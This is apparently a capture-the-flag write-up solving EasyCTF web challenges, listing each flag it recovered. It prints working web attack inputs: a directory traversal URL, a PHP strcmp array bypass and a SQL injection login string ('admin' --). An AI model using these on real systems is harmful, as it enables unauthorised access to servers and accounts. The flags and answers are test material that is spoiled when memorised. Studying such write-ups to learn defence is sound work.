Web
-----


Plot Twist - 20 pts
----------

For this challenge we were given a webpage: https://www.easyctf.com/static/problems/plot-twist/index.html
Normally the first problem has the flag 'hidden' as a comment, but they predicted that' 
```html
    <!-- you thought the flag would be in the comments didn't you? nice try we're better than that -->
```
Just a line down though, there is a line that says
```html
<script type="text/javascript" src="script.js"></script>
```
Upon opening script.js I saw 
```js
console.log('no one would EVER think to look in the console! flag backup: easyctf{remember_to_check_everywhere}');
```

Teach Me How to Write Like This - 30pts
----------------------

This challenge gives us a wbesite where the content is blurred, but if we just look at the source. (Firefox use: view-source before the url) we can see the content just fine

```
flag: easyctf{geico_geck0s}
```

2147483648% Secure - 35 pts
-------------------
This challenge has a webpage which says there is a hidden flag. It's not hidden in plain text in the source, but there is a bit of obfustaced Javascript

```js
			var _0xa107=["\x64\x65\x76\x65\x6C\x6F\x70\x65\x72\x5F\x63\x6F\x6E\x73\x6F\x6C\x65\x5F\x69\x73\x5F\x79\x6F\x75\x72\x5F\x66\x72\x69\x65\x6E\x64","\x65\x61\x73\x79\x63\x74\x66\x7B","\x7D"];
			var _0x6fdc=[_0xa107[0],_0xa107[1],_0xa107[2]];
			var secret=_0x6fdc[0];
			secret=_0x6fdc[1]+secret+_0x6fdc[2];
```
There is no need to deobfuscate it in this case, we know the name of the variable where the data is being stored. Open up the console, and run console.log(secret)

```
flag: easyctf{developer_console_is_your_friend}
```

Wastebin 1 - 90 pts 
-----------------
This challenge wasn't worth 90 points, it shows the dangers of using client side authentication though. If we look at the source we see an array of user credentials. Admin is 
```
flag: easyctf{cr4zy_p4ssw0rds}
```

Easter - 100 pts
-----------
This challenge has a webpage where there isn't much you can do. There is a single image on the page, and the source reveals loads of obfuscated javascript. I wasted a lot of time trying to deobfuscate it, in reality the solution was to enter the konami code and press enter. Once entered, the page spat out some binary
```
01111011011011010110100101110011011100110110100101101111011011100111001101110101011000110110001101100101011100110111001101111101
```
A quick binary to ascii translation and we get:
```
easyctf{missionsuccess}
```

Personal Home Page - 225 pts
------------
The Web challenges started getting interesting here. On the main page the url is http://web.easyctf.com:10200/?page=pages/index.html

The GET value being set is the page value, which means we can control what is viewed. 

http://web.easyctf.com:10200/supersecretflag.txt however is still unaccesable. 
This is something called local file inclusion, where we can view data stored on the server.
Set the paramater to: http://web.easyctf.com:10200/?page=pages/supersecretflag.txt
And...

```
 Are you trying to hack me? 
```

It knows!

jk, directory traversal, move up one dir and we can find the file easily:
```
http://web.easyctf.com:10200/?page=pages/../supersecretflag.txt
```
There we go
```
flag:  easyctf{file_get_contents_is_9_safe} 
```

Super Secure Lemons - 225 pts
-----------------------

This page happens to use SSL, but my browser gave me an error while viewing it. I ignored it because that happens often when you run your own page, you use self signed certs. Once on the page, I inspected the SSL cert via Firefox.
```
flag: easyctf{never_trust_se1f_signd_certificates}
```

Wastebin 2 - 250 pts
------------------
Here is the information given for this challenge
```
So after the previous fiasco, I decided to generate a random admin password, and hide it in a file that no one will ever find. And don't try Googling it either, cuz Google can't find it either! Hahaha >:) Link
```

There is a hint in there, not to google it. Google is known for crawling sites, and using a robots.txt file to guide itself. 
Looking at http://web.easyctf.com:10207/robots.txt we see:
```
User-agent: *
Disallow: /2/password_Tj9WBkFpORmHYaYBG5GR7VZzgDaEM2e2aWeeCRtJ.txt
```
Check the page, and sure enough the password is right there: 11FutLBObDdAnSIyEo9LF6TLiWuG8GpHSLnRBAYD4jUGM0O4Jbt8KPasU5CpAGmZW2dX97HX4xHau8asmrN5CzIiM6Xb51plWa3q

Now, login as admin, and easy, done:
```
flag: easyctf{looks_like_my_robot_proof_protection_isn't_very_human_proof}
```

Pretty Horrible Programming - 275 pts
-------------------------------------
This page has a login form. The source tells us that the PHP (as indicated by the title) is located at index.source.php

The php loads in the flag as a variable, then reads the get variables for the password. As a side note, sneding passwords via get is a terrible idea. The relevant code is this

```php
            if (isset($_GET["password"])) {
                if (strcmp($_GET["password"], $pass) == 0) {
                    $auth = true;
                
```
The flaw is the use of strcmp. Some quick googling and I find an article that for bypassing [strcmp](http://danuxx.blogspot.com/2013/03/unauthorized-access-bypassing-php-strcmp.html)

The idea is to pass it an array and cause an error. When we click login with a password, the url looks like this
```
http://web.easyctf.com:10201/index.php?password=random
```

Set password to an array, and done.
```
http://web.easyctf.com:10201/index.php?password[]=asdsd
```
It errors out and echos the flag
```
flag: easyctf{never_trust_strcmp} 
```


Wastebin 3 - 325 pts 
-----------------------
Wastebin 3 presents us with a familiar login page. The source also tells us the location of the php source code.
The relevant code is:

```php
            include("functions.php"); // connect to mysql server
            
            $query = "SELECT * FROM `users` WHERE username='$username' AND password='$password'";
            $result = mysql_query($query);
            $rows = array();
            while($row = mysql_fetch_array($result)) {
                $rows[] = $row;
```
This code is vulnerable to SQLi (SQL Injection).
If we pass the correct value to user name, we can make the entire right side of the query useless:
```
admin' -- 
```
What this does is close the ' in the query, and then comment out the rest, so the query looks like:
```sql
$query = "SELECT * FROM `users` WHERE username='admin' -- ' AND password='$password'";
```
Done
```
flag: easyctf{54771309-67e5-4704-8743-6981a40b}
```
